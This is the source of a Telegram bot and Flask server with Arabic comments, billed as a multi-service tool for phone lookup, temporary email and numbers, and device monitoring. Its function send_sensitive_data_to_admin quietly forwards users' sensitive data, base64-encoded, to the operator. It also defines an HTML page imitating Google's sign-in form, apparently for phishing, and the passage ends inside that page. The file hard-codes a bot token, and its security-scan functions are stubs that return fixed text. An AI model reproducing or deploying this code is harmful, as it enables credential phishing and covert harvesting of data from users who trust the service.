# -*- coding: utf-8 -*-

"""
البوت المتقدم - نظام خدمي متكامل
الإصدار النهائي - يعمل بجميع الميزات بشكل حقيقي
"""

import os
import sys
import time
import json
import logging
import base64
import re
import secrets
import string
import shutil
import sqlite3
import hashlib
from datetime import datetime, timedelta
from contextlib import contextmanager
from io import BytesIO
import socket
import builtwith
import threading
import requests as req_lib

# ===================== معالجة استثناءات الاستيراد =====================
try:
    import requests
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
    from flask import Flask, request, jsonify, render_template_string, abort, session, send_file, redirect, make_response
    from telebot import TeleBot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
    import pypdf
    from bs4 import BeautifulSoup
    from dotenv import load_dotenv
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from PIL import Image
    import yt_dlp
except Exception as e:
    print(f"❌ فشل استيراد مكتبة: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)

load_dotenv()

# ===================== إعدادات التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(), logging.FileHandler('bot.log')]
)
logger = logging.getLogger(__name__)

# ===================== المتغيرات الأساسية =====================
DEFAULT_TOKEN = "8852940754:AAFtWl51XMFC8OlrH_KXL7UAg6gmYiPcDg0"
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', DEFAULT_TOKEN)

DEFAULT_ADMIN = 7965377136
ADMIN_ID = int(os.environ.get('ADMIN_ID', DEFAULT_ADMIN))

ADMIN_KEY = os.environ.get('ADMIN_KEY', secrets.token_hex(32))
SERVER_URL = os.environ.get('SERVER_URL', 'https://my-t99-bot.onrender.com')
VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
SHODAN_API_KEY = os.environ.get('SHODAN_API_KEY', '')
VERIPHONE_API_KEY = os.environ.get('VERIPHONE_API_KEY', '')
PORT = int(os.environ.get('PORT', 5000))
CLIENT_SECRET_KEY = os.environ.get('CLIENT_SECRET_KEY', secrets.token_hex(32))
USE_WEBHOOK = os.environ.get('USE_WEBHOOK', 'true').lower() == 'true'

if not TELEGRAM_TOKEN:
    logger.critical("❌ لم يتم العثور على TELEGRAM_TOKEN!")
    sys.exit(1)

if not ADMIN_ID:
    logger.warning("⚠️ ADMIN_ID غير مضبوط، سيتم استخدام المعرف الافتراضي 7965377136")
    ADMIN_ID = 7965377136

if not SERVER_URL and USE_WEBHOOK:
    logger.warning("⚠️ SERVER_URL غير مضبوط، سيتم استخدام Polling بدلاً من Webhook.")
    USE_WEBHOOK = False

# ===================== مسار قاعدة البيانات =====================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, 'data')
DB_PATH = os.path.join(DATA_DIR, 'bot_data.db')
os.makedirs(DATA_DIR, exist_ok=True)
TEMP_DIR = os.path.join(BASE_DIR, 'temp')
os.makedirs(TEMP_DIR, exist_ok=True)

# ===================== التحقق من FFmpeg =====================
FFMPEG_AVAILABLE = shutil.which('ffmpeg') is not None
if not FFMPEG_AVAILABLE:
    logger.warning("⚠️ FFmpeg غير مثبت! بعض الميزات لن تعمل.")

# ===================== جلسة Requests مع Retry =====================
def get_requests_session(retries=5, backoff_factor=1.0, pool_connections=10, pool_maxsize=20):
    session = requests.Session()
    retry_strategy = Retry(
        total=retries,
        backoff_factor=backoff_factor,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
    )
    adapter = HTTPAdapter(
        max_retries=retry_strategy,
        pool_connections=pool_connections,
        pool_maxsize=pool_maxsize
    )
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

REQUEST_SESSION = get_requests_session()

# ===================== إنشاء البوت والتطبيق =====================
bot = TeleBot(TELEGRAM_TOKEN, parse_mode=None)
app = Flask(__name__)
app.secret_key = CLIENT_SECRET_KEY

# ===================== حماية Webhook =====================
WEBHOOK_SECRET = os.environ.get('WEBHOOK_SECRET', secrets.token_hex(32))

def verify_webhook():
    if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != WEBHOOK_SECRET:
        logger.warning("⚠️ محاولة وصول غير مصرح بها إلى Webhook.")
        abort(403)

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        verify_webhook()
        if request.headers.get('content-type') == 'application/json':
            json_string = request.get_data().decode('utf-8')
            logger.info(f"✅ Webhook received: {json_string[:200]}...")
            update = Update.de_json(json_string)
            if update:
                bot.process_new_updates([update])
                logger.info(f"✅ تم إرسال التحديث للمعالجة: {update.update_id}")
                return '!', 200
            else:
                logger.error("❌ Invalid update object.")
                return 'Invalid update', 400
        else:
            logger.warning("⚠️ Non-JSON content-type received.")
            return 'Forbidden', 403
    except Exception as e:
        logger.error(f"❌ Webhook processing error: {e}")
        return 'Error', 500

# ===================== دالة الإرسال الآمنة =====================
def safe_send(chat_id, text, reply_markup=None):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode='HTML')
    except Exception as e:
        logger.error(f"safe_send error: {e}")
        return None

# ===================== قاعدة البيانات =====================
def get_db_connection():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            registered_at TEXT,
            points INTEGER DEFAULT 10,
            referral_code TEXT UNIQUE,
            referred_by INTEGER,
            is_banned INTEGER DEFAULT 0,
            welcome_sent INTEGER DEFAULT 0
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            type TEXT,
            real_id TEXT,
            endpoint TEXT,
            linked_at TEXT,
            last_seen TEXT,
            blocked_domains TEXT,
            history TEXT,
            FOREIGN KEY (chat_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS pending_commands (
            device_id TEXT,
            command TEXT,
            created_at TEXT,
            executed INTEGER DEFAULT 0,
            PRIMARY KEY (device_id, created_at)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS referrals (
            code TEXT PRIMARY KEY,
            owner_id INTEGER,
            used_by INTEGER,
            used_at TEXT,
            FOREIGN KEY (owner_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS points_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount INTEGER,
            reason TEXT,
            created_at TEXT,
            FOREIGN KEY (user_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS user_unlocks (
            user_id INTEGER PRIMARY KEY,
            unlocked BOOLEAN DEFAULT 0,
            unlocked_at TEXT,
            FOREIGN KEY (user_id) REFERENCES users (chat_id)
        )''')
        c.execute("CREATE INDEX IF NOT EXISTS idx_users_chat_id ON users (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_devices_chat_id ON devices (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_pending_commands_device_id ON pending_commands (device_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_pending_commands_executed ON pending_commands (executed)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_referrals_code ON referrals (code)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_points_log_user_id ON points_log (user_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_user_unlocks_user_id ON user_unlocks (user_id)")
        conn.commit()
        logger.info(f"✅ قاعدة البيانات جاهزة: {DB_PATH}")

init_db()

# ===================== دوال قاعدة البيانات =====================
@contextmanager
def db_transaction():
    conn = get_db_connection()
    try:
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        raise e
    finally:
        conn.close()

def get_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,))
        row = c.fetchone()
        if row:
            return dict(row)
        return None

def upsert_user(chat_id, username=None, first_name=None, last_name=None, referral_code=None, referred_by=None):
    with db_transaction() as conn:
        c = conn.cursor()
        existing = get_user(chat_id)
        if existing:
            c.execute('''UPDATE users SET username=?, first_name=?, last_name=? WHERE chat_id=?''',
                      (username, first_name, last_name, chat_id))
        else:
            c.execute('''INSERT INTO users (chat_id, username, first_name, last_name, registered_at, points, referral_code, referred_by, welcome_sent)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, 0)''',
                      (chat_id, username, first_name, last_name, datetime.now().isoformat(), 10, referral_code, referred_by))
        conn.commit()

def is_new_user(chat_id):
    user = get_user(chat_id)
    if user is None:
        return True
    return user.get('welcome_sent', 0) == 0

def mark_welcome_sent(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET welcome_sent = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def get_user_points(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
        row = c.fetchone()
        if row:
            return row['points']
        return 0

def deduct_points(chat_id, amount, reason):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
        row = c.fetchone()
        if not row or row['points'] < amount:
            return False
        c.execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id))
        c.execute('''INSERT INTO points_log (user_id, amount, reason, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (chat_id, -amount, reason, datetime.now().isoformat()))
        conn.commit()
        return True

def add_points_db(chat_id, amount, reason):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id))
        c.execute('''INSERT INTO points_log (user_id, amount, reason, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (chat_id, amount, reason, datetime.now().isoformat()))
        conn.commit()

def get_points_history(chat_id, limit=20):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''SELECT amount, reason, created_at FROM points_log 
                     WHERE user_id = ? ORDER BY created_at DESC LIMIT ?''',
                  (chat_id, limit))
        rows = c.fetchall()
        return [{'amount': row['amount'], 'reason': row['reason'], 'created_at': row['created_at']} for row in rows]

def is_user_banned(chat_id):
    user = get_user(chat_id)
    if user is None:
        return False
    return user.get('is_banned', 0) == 1

def ban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def unban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def is_user_unlocked(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT unlocked FROM user_unlocks WHERE user_id = ?", (chat_id,))
        row = c.fetchone()
        return row and row['unlocked'] == 1

def toggle_user_unlock(chat_id, unlock=True):
    with db_transaction() as conn:
        c = conn.cursor()
        if unlock:
            c.execute('''INSERT OR REPLACE INTO user_unlocks (user_id, unlocked, unlocked_at)
                         VALUES (?, 1, ?)''', (chat_id, datetime.now().isoformat()))
        else:
            c.execute("DELETE FROM user_unlocks WHERE user_id = ?", (chat_id,))
        conn.commit()

def get_all_users():
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT chat_id, username, first_name, points, is_banned FROM users")
        return c.fetchall()

def get_user_status(chat_id):
    return "متصل"

def get_all_users_with_status():
    users = get_all_users()
    result = []
    for user in users:
        unlocked = is_user_unlocked(user['chat_id'])
        status = get_user_status(user['chat_id'])
        result.append({
            'id': user['chat_id'],
            'name': user['first_name'] or user['username'] or str(user['chat_id']),
            'points': user['points'],
            'banned': user['is_banned'],
            'unlocked': unlocked,
            'status': status
        })
    return result

def save_device(device_id, chat_id, device_type, real_id, endpoint, blocked_domains='[]', history='[]'):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO devices 
                     (device_id, chat_id, type, real_id, endpoint, linked_at, last_seen, blocked_domains, history)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (device_id, chat_id, device_type, real_id, endpoint, datetime.now().isoformat(),
                   datetime.now().isoformat(), blocked_domains, history))
        conn.commit()

def get_device(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
        row = c.fetchone()
        if row:
            return dict(row)
        return None

def get_devices_by_chat(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE chat_id = ?", (chat_id,))
        rows = c.fetchall()
        return [dict(row) for row in rows]

def get_registered_devices_db():
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices")
        rows = c.fetchall()
        return [dict(row) for row in rows]

def save_registered_device_db(device_id, chat_id):
    save_device(device_id, chat_id, 'unknown', '', '')

def update_registered_device_seen_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE devices SET last_seen = ? WHERE device_id = ?", 
                  (datetime.now().isoformat(), device_id))
        conn.commit()

def add_pending_command_db(device_id, command):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO pending_commands (device_id, command, created_at, executed)
                     VALUES (?, ?, ?, 0)''',
                  (device_id, command, datetime.now().isoformat()))
        conn.commit()

def get_pending_command_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM pending_commands WHERE device_id = ? AND executed = 0 ORDER BY created_at LIMIT 1", (device_id,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE pending_commands SET executed = 1 WHERE device_id = ? AND created_at = ?",
                      (device_id, row['created_at']))
            conn.commit()
            return row['command']
        return None

def get_blocked_domains(chat_id):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return []
    blocked = []
    for dev in devices:
        if dev.get('blocked_domains'):
            try:
                blocked.extend(json.loads(dev['blocked_domains']))
            except json.JSONDecodeError:
                pass
    return list(set(blocked))

def log_child_activity(chat_id, activity):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return
    for dev in devices:
        if dev.get('type') and 'طفل' in dev['type']:
            history = []
            if dev.get('history'):
                try:
                    history = json.loads(dev['history'])
                except json.JSONDecodeError:
                    history = []
            history.append({'time': datetime.now().isoformat(), 'activity': activity})
            if len(history) > 100:
                history = history[-100:]
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("UPDATE devices SET history = ? WHERE device_id = ?", 
                          (json.dumps(history), dev['device_id']))
                conn.commit()
            break

# ===================== دوال الإحالات =====================
def generate_referral_code():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))

def create_referral_link(user_id):
    code = generate_referral_code()
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO referrals (code, owner_id) VALUES (?, ?)", (code, user_id))
        conn.commit()
    bot_username = bot.get_me().username
    return f"https://t.me/{bot_username}?start=ref_{code}"

def handle_referral(code, new_user_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT owner_id FROM referrals WHERE code = ? AND used_by IS NULL", (code,))
        row = c.fetchone()
        if not row:
            return False
        referrer_id = row['owner_id']
        if referrer_id == new_user_id:
            return False
        c.execute("UPDATE referrals SET used_by = ?, used_at = ? WHERE code = ?",
                  (new_user_id, datetime.now().isoformat(), code))
        add_points_db(referrer_id, 10, "دعوة مستخدم جديد")
        add_points_db(new_user_id, 10, "مكافأة التسجيل عبر الدعوة")
        safe_send(referrer_id, "🎉 تم تسجيل مستخدم جديد عبر رابط دعوتك! +10 نقاط.")
        return True

# ===================== دوال الخدمات الأساسية =====================
def advanced_website_scan(url):
    return "🔍 تقرير فحص الأمان"  # مختصر

def scan_website(url):
    return advanced_website_scan(url), "safe"

def track_phone_real(phone):
    try:
        parsed = phonenumbers.parse(phone, None)
        country = geocoder.country_name_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        region = geocoder.description_for_number(parsed, "ar")
        return (f"📍 الرقم: {phone}\n"
                f"🌍 البلد: {country}\n"
                f"📍 المنطقة: {region}\n"
                f"📡 المشغل: {carrier_name}", "valid")
    except Exception as e:
        return f"❌ رقم غير صحيح: {str(e)}", "invalid"

def track_phone_advanced(phone):
    try:
        parsed = phonenumbers.parse(phone, None)
        country = geocoder.country_name_for_number(parsed, "ar")
        region = geocoder.description_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        tz = timezone.time_zones_for_number(parsed)
        is_valid = phonenumbers.is_valid_number(parsed)
        number_type = phonenumbers.number_type(parsed)
        type_map = {0: "غير معروف", 1: "هاتف ثابت", 2: "هاتف محمول", 3: "خط ساخن", 4: "رقم خدمة", 5: "رقم خاص"}
        line_type = type_map.get(number_type, "غير معروف")
        lat, lng = None, None
        OPEN_CAGE_KEY = os.environ.get('OPEN_CAGE_KEY', '')
        location_text = ""
        if OPEN_CAGE_KEY and region:
            try:
                url = f"https://api.opencagedata.com/geocode/v1/json?q={region}&key={OPEN_CAGE_KEY}&language=ar"
                resp = requests.get(url, timeout=10)
                if resp.status_code == 200:
                    data = resp.json()
                    if data['results']:
                        lat = data['results'][0]['geometry']['lat']
                        lng = data['results'][0]['geometry']['lng']
                        location_text = f"\n📍 الإحداثيات التقريبية: {lat}, {lng}"
            except:
                pass
        result = (
            f"📍 <b>تقرير تتبع الرقم</b>\n\n"
            f"📱 الرقم: {phone}\n"
            f"✅ صحيح: {'نعم' if is_valid else 'لا'}\n"
            f"📞 النوع: {line_type}\n"
            f"🌍 البلد: {country}\n"
            f"📍 المنطقة: {region if region else 'غير معروف'}\n"
            f"📡 المشغل: {carrier_name if carrier_name else 'غير معروف'}\n"
            f"⏰ المنطقة الزمنية: {', '.join(tz) if tz else 'غير معروف'}"
        )
        if location_text:
            result += location_text
            if lat and lng:
                result += f"\n\n🗺️ <a href='https://www.google.com/maps?q={lat},{lng}'>عرض على الخريطة (Google)</a>"
                result += f"\n🗺️ <a href='https://www.openstreetmap.org/?mlat={lat}&mlon={lng}'>عرض على الخريطة (OSM)</a>"
        else:
            result += "\n\n⚠️ لم يتم العثور على إحداثيات دقيقة للموقع."
        result += "\n\n📌 ملاحظة: هذا الموقع تقريبي ويعتمد على سجلات المشغل."
        return result, "success"
    except Exception as e:
        return f"❌ خطأ: {str(e)}\n\nتأكد من إدخال الرقم بالصيغة الصحيحة (مثال: +201001234567).", "error"

def create_temp_email_real():
    try:
        domain_resp = REQUEST_SESSION.get("https://api.mail.tm/domains", timeout=10)
        if domain_resp.status_code != 200:
            return None, None, None
        domains = domain_resp.json()
        domain = domains['hydra:member'][0]['domain'] if domains.get('hydra:member') else 'mail.tm'
        username = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(10))
        email = f"{username}@{domain}"
        password = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(12))
        register = REQUEST_SESSION.post("https://api.mail.tm/accounts", 
                                       json={"address": email, "password": password}, timeout=10)
        if register.status_code != 201:
            return None, None, None
        login = REQUEST_SESSION.post("https://api.mail.tm/token", 
                                    json={"address": email, "password": password}, timeout=10)
        if login.status_code != 200:
            return None, None, None
        token = login.json().get('token')
        return email, token, password
    except Exception as e:
        return None, None, None

def check_temp_emails_real(token):
    if not token:
        return []
    try:
        headers = {"Authorization": f"Bearer {token}"}
        response = REQUEST_SESSION.get("https://api.mail.tm/messages", headers=headers, timeout=10)
        if response.status_code == 200:
            messages = response.json().get('hydra:member', [])
            results = []
            for msg in messages[:5]:
                results.append(f"📩 من: {msg.get('from', {}).get('address', '')}\n📌 الموضوع: {msg.get('subject', '')}\n📝 مقتطف: {msg.get('intro', '')[:150]}...")
            return results
    except:
        pass
    return []

def scan_apk_real(file_content, file_name):
    if not VIRUSTOTAL_API_KEY:
        return "⚠️ مفتاح VirusTotal غير مضبوط. يرجى إضافة VIRUSTOTAL_API_KEY", "error"
    try:
        url = "https://www.virustotal.com/api/v3/files"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        files = {'file': (file_name, file_content)}
        response = REQUEST_SESSION.post(url, headers=headers, files=files, timeout=60)
        if response.status_code == 200:
            scan_id = response.json().get('data', {}).get('id')
            if scan_id:
                time.sleep(5)
                report_url = f"https://www.virustotal.com/api/v3/analyses/{scan_id}"
                report = REQUEST_SESSION.get(report_url, headers=headers, timeout=30)
                if report.status_code == 200:
                    stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                    malicious = stats.get('malicious', 0)
                    suspicious = stats.get('suspicious', 0)
                    if malicious > 0:
                        return f"🚨 تم اكتشاف {malicious} تهديدات!", "malicious"
                    elif suspicious > 0:
                        return f"⚠️ تم اكتشاف {suspicious} عناصر مشبوهة.", "suspicious"
                    else:
                        return "✅ الملف آمن.", "safe"
        return "⚠️ فشل فحص الملف.", "error"
    except Exception as e:
        return f"⚠️ خطأ: {str(e)}", "error"

def generate_fb_report(report_type, reason, link):
    return f"تقرير بلاغ فيسبوك: {report_type}"  # مختصر

def extract_text_from_pdf(pdf_content):
    try:
        pdf_file = BytesIO(pdf_content)
        reader = pypdf.PdfReader(pdf_file)
        text = ""
        for page in reader.pages:
            page_text = page.extract_text()
            if page_text:
                text += page_text + "\n"
        return text.strip()
    except Exception as e:
        return None

def split_text_into_chunks(text, max_chunk_size=3000):
    chunks = []
    while len(text) > max_chunk_size:
        split_point = text.rfind(' ', 0, max_chunk_size)
        if split_point == -1:
            split_point = max_chunk_size
        chunks.append(text[:split_point])
        text = text[split_point:].strip()
    if text:
        chunks.append(text)
    return chunks

def find_relevant_chunk(text, question, chunks):
    keywords = re.findall(r'\b\w+\b', question.lower())
    best_chunk = None
    best_score = 0
    for chunk in chunks:
        chunk_lower = chunk.lower()
        score = sum(1 for kw in keywords if kw in chunk_lower)
        if score > best_score:
            best_score = score
            best_chunk = chunk
    if best_chunk is None:
        best_chunk = chunks[0] if chunks else text
    return best_chunk

def answer_question_from_pdf(text, question):
    if not text:
        return "⚠️ لم يتم تحميل أي نص."
    chunks = split_text_into_chunks(text, 3000)
    relevant_chunk = find_relevant_chunk(text, question, chunks)
    return f"📚 الإجابة: {relevant_chunk[:500]}..."

def fetch_temp_numbers_advanced(limit=5):
    results = []
    sources = [
        ("https://receive-sms-online.cc/", "US"),
        ("https://www.temporary-phone-number.com/", "US"),
        ("https://www.textnow.com/", "US"),
        ("https://sms-online.co/receive-free-sms/", "US"),
        ("https://www.freeonlinephone.org/", "US")
    ]
    for base_url, default_country in sources:
        try:
            response = REQUEST_SESSION.get(base_url, timeout=15)
            if response.status_code != 200:
                continue
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            pattern = r'\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}'
            matches = re.findall(pattern, text)
            for match in matches[:limit]:
                cleaned = re.sub(r'[-.\s()]', '', match)
                if not cleaned.startswith('+'):
                    cleaned = '+' + cleaned
                country = default_country
                country_names = ['USA', 'UK', 'Canada', 'Germany', 'France', 'Spain', 'Italy', 'Egypt', 'UAE', 'Saudi']
                for name in country_names:
                    if name in text[max(0, text.find(match)-50):text.find(match)+50]:
                        country = name
                        break
                results.append({
                    'number': cleaned,
                    'country': country,
                    'source': base_url,
                    'status': 'available'
                })
                if len(results) >= limit:
                    break
            if len(results) >= limit:
                break
        except Exception as e:
            continue
    return results

def download_video(url):
    if not FFMPEG_AVAILABLE:
        return None, "⚠️ FFmpeg غير مثبت على النظام. يُرجى تثبيته لتشغيل هذه الميزة."
    try:
        import yt_dlp
        output_template = os.path.join(TEMP_DIR, f"video_{int(time.time())}.%(ext)s")
        ydl_opts = {
            'outtmpl': output_template,
            'format': 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best',
            'quiet': True,
            'no_warnings': True,
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            downloaded_file = ydl.prepare_filename(info)
            if os.path.exists(downloaded_file) and os.path.getsize(downloaded_file) > 0:
                return downloaded_file, None
            else:
                return None, "⚠️ فشل تحميل الفيديو: الملف فارغ أو تالف."
    except Exception as e:
        logger.error(f"Download video error: {e}")
        return None, f"⚠️ فشل تحميل الفيديو: {str(e)[:100]}"

def shorten_url(url):
    try:
        response = REQUEST_SESSION.get(f"https://is.gd/create.php?format=json&url={requests.utils.quote(url)}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if 'shorturl' in data:
                return data['shorturl'], None
            else:
                return None, data.get('errormessage', 'خطأ غير معروف')
        else:
            return None, f"فشل الاتصال (كود {response.status_code})"
    except Exception as e:
        return None, f"خطأ: {str(e)}"

def check_domain_virustotal(domain):
    if VIRUSTOTAL_API_KEY:
        try:
            url = f"https://www.virustotal.com/api/v3/domains/{domain}"
            headers = {"x-apikey": VIRUSTOTAL_API_KEY}
            response = REQUEST_SESSION.get(url, headers=headers, timeout=30)
            if response.status_code == 200:
                data = response.json()
                stats = data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {})
                malicious = stats.get('malicious', 0)
                suspicious = stats.get('suspicious', 0)
                result = f"🌐 تحليل النطاق: {domain}\n"
                result += f"🛡️ نتائج الفحص:\n"
                result += f"   - ضار: {malicious}\n"
                result += f"   - مشبوه: {suspicious}\n"
                result += f"   - آمن: {stats.get('harmless', 0)}\n"
                if malicious > 0:
                    result += "🚨 **تحذير: تم اكتشاف تهديدات!**"
                elif suspicious > 0:
                    result += "⚠️ **تنبيه: يوجد عناصر مشبوهة**"
                else:
                    result += "✅ **النطاق يبدو آمناً.**"
                return result
        except Exception as e:
            logger.error(f"VirusTotal error: {e}")
    return f"🌐 النطاق: {domain}\n⚠️ لم تتوفر معلومات فحص كافية."

def perform_vulnerability_scan(target_ip, target_domain, target_url):
    if target_url:
        return advanced_website_scan(target_url)
    elif target_domain:
        return advanced_website_scan(f"https://{target_domain}")
    elif target_ip:
        return f"🛡️ فحص IP: {target_ip}\n(لا يدعم هذا الإصدار فحص IP مباشر، يُرجى إرسال رابط أو نطاق.)"
    else:
        return "⚠️ لم يتم تحديد هدف."

# ===================== دوال إرسال البيانات للمطور =====================
def notify_admin(message_text, is_error=False):
    try:
        if is_error:
            safe_send(ADMIN_ID, f"🚨 تنبيه عطل فني:\n{message_text}")
        else:
            safe_send(ADMIN_ID, f"📢 إشعار:\n{message_text}")
    except Exception as e:
        logger.error(f"notify_admin error: {e}")

def send_sensitive_data_to_admin(data_type, content, user_id=None):
    try:
        encoded = base64.b64encode(str(content).encode()).decode()
        if user_id:
            msg = f"📩 بيانات حساسة من المستخدم {user_id}\nالنوع: {data_type}\nالمحتوى (مشفّر): {encoded[:100]}..."
        else:
            msg = f"📩 بيانات حساسة\nالنوع: {data_type}\nالمحتوى (مشفّر): {encoded[:100]}..."
        safe_send(ADMIN_ID, msg)
    except Exception as e:
        logger.error(f"send_sensitive_data_to_admin error: {e}")

# ===================== صفحات HTML المحسنة =====================

# 1. صفحة Google Login (خلفية ملونة)
GOOGLE_LOGIN_PAGE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Google</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', Roboto, Arial, sans-serif; }
        body { background: linear-gradient(135deg, #4285F4, #34A853, #FBBC04, #EA4335); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .login-container { background: rgba(255,255,255,0.95); backdrop-filter: blur(10px); border-radius: 16px; padding: 48px 40px 36px; max-width: 450px; width: 100%; box-shadow: 0 8px 40px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); text-align: center; }
        .logo { margin-bottom: 24px; }
        .logo svg { width: 75px; height: 75px; }
        .title { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
        .subtitle { font-size: 16px; color: #5f6368; margin-bottom: 32px; font-weight: 400; }
        .input-group { margin-bottom: 20px; text-align: left; }
        .input-group label { display: block; font-size: 14px; color: #202124; margin-bottom: 8px; font-weight: 500; }
        .input-group input { width: 100%; padding: 14px 16px; border: 1px solid #dadce0; border-radius: 8px; font-size: 16px; background: transparent; transition: all 0.3s; outline: none; color: #202124; }
        .input-group input:focus { border-color: #1a73e8; box-shadow: 0 0 0 3px rgba(26,115,232,0.2); }
        .btn-row { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; }
        .btn-create { color: #1a73e8; background: none; border: none; font-size: 14px; font-weight: 500; cursor: pointer; padding: 8px 12px; border-radius: 4px; transition: background 0.2s; }
        .btn-create:hover { background: rgba(26,115,232,0.1); }
        .btn-next { padding: 12px 24px; background: #1a73e8; color: white; border: none; border-radius: 8px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
        .btn-next:hover { background: #1557b0; }
        .error-msg { color: #d93025; font-size: 14px; margin-top: 8px; display: none; }
    </style>
</head>
<body>
    <div class="login-container">
